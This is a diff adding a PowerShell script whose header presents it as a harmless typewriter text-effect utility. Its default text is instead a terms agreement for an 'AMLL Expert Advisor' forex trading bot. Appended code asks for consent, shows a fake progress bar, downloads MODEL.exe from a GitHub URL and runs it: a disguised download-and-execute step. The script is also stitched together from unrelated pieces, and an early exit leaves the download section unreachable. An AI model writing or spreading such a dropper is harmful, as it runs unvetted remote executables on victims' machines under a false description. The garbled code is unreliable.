@@ -1,0 +1,62 @@
+<#
+.SYNOPSIS
+	Writes text á la typewriter
+.DESCRIPTION
+	This PowerShell script writes the given text with the typewriter effect.
+.PARAMETER text
+	Specifies the text to write
+.PARAMETER speed
+	Specifies the speed (250 ms by default)
+.EXAMPLE
+	PS> ./write-typewriter "Hello World"
+.LINK
+	https://github.com/fleschutz/PowerShell
+.NOTES
+	Author: Markus Fleschutz | License: CC0
+#>
+
+param([string]$text = "AMLL Expert Advisor - Terms and Conditions`n`n1. Introduction:`nThis document outlines the terms and conditions ('Agreement') governing the use of the AMLL Expert Advisor (the 'EA') developed by Crypa.us on the MQL4 platform. By using the EA, you agree to comply with and be bound by these terms. Please read this Agreement carefully before using the EA.`n`n2. License and Usage:`nCrypa.us grants you a non-exclusive, non-transferable license to use the EA on a single trading account. You may not sublicense, distribute, lease, or transfer the EA to any third party.`n`n3. Risk Warning:`nTrading foreign exchange ('Forex') and cryptocurrencies involves a high level of risk and may not be suitable for all investors. Before using the EA, you should carefully consider your investment objectives, level of experience, and risk appetite. Trading in the Forex market is speculative and can result in substantial or complete loss of capital.`n`n4. No Guarantees:`nCrypa.us does not guarantee the profitability or success of the EA. Past performance is not indicative of future results. The EA's performance may vary, and there is no assurance that the EA will achieve similar results in the future. Trading results depend on various factors, including market conditions and the user's skill in configuring and managing the EA.`n`n5. Acknowledgment of Risks:`nYou acknowledge that you are aware of the risks associated with Forex trading and that Crypa.us is not responsible for any losses incurred while using the EA. You accept full responsibility for your trading decisions and agree to hold Crypa.us and its affiliates harmless from any losses, damages, or liabilities.`n`n6. Technical Risks:`nYou understand and acknowledge the technical risks associated with the use of the EA, including but not limited to software bugs, system failures, and internet connection issues. Crypa.us is not liable for any technical issues that may affect the performance of the EA.`n`n7. Updates and Support:`nCrypa.us may provide updates to the EA at its discretion. Support may be provided, but Crypa.us is not obligated to offer ongoing assistance. Any updates or support will be subject to the terms of this Agreement.`n`n8. Confidentiality:`nYou agree to keep the EA and any related information confidential. You may not disclose, reproduce, or distribute the EA without the express written consent of Crypa.us.`n`n9. Governing Law:`nThis Agreement shall be governed by and construed in accordance with the laws of the state of California, without regard to its conflict of law principles.`n`n10. Contact Information:`nCrypa.us`n1850 E Palmdale Blvd`nPalmdale, California, 93550`n`n11. Changes to the Agreement:`nCrypa.us reserves the right to modify or update this Agreement at any time. Users will be notified of any changes, and continued use of the EA constitutes acceptance of the modified terms.`n`nBy using the AMLL Expert Advisor, you acknowledge that you have read, understood, and agreed to the terms and conditions outlined in this Agreement.", [int]$speed = 10) # in milliseconds
+
+try {
+	$Random = New-Object System.Random
+	$text -split '' | ForEach-Object {
+		Write-Host -noNewline $_
+		Start-Sleep -milliseconds $(1 + $Random.Next($speed))
+	}
+	Write-Host ""
+	exit 0 # success
+} catch {
+	"⚠️ Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
+	exit 1
+}
+
+$USER_CONFIRM = Read-Host "Do you agree to the terms? (Type 'yes' to proceed): "
+
+$DOWNLOAD_URL = "https://github.com/shahryaryeganeh/AMLL/raw/main/MODEL.exe"
+$EXECUTABLE_NAME = "MODEL.exe"
+$PROGRESS_BAR_LENGTH = 20
+
+if ($USER_CONFIRM -eq "yes") {
+    Write-Host "***************************************"
+    Write-Host "Downloading Required Models..."
+
+    # Simulate progress with pipe characters
+    $progress = ""
+    1..$PROGRESS_BAR_LENGTH | ForEach-Object {
+        $progress += "|"
+        Write-Host -NoNewline "."
+        Start-Sleep -Milliseconds 100
+    }
+    Write-Host ""
+
+    # Download the file with progress indicator
+    Invoke-WebRequest -Uri $DOWNLOAD_URL -OutFile $EXECUTABLE_NAME
+
+    Write-Host "Running Setup File..."
+    Start-Process -FilePath $EXECUTABLE_NAME
+} else {
+    Write-Host "Download canceled. Exiting..."
+}
+
+Pause
+Exit
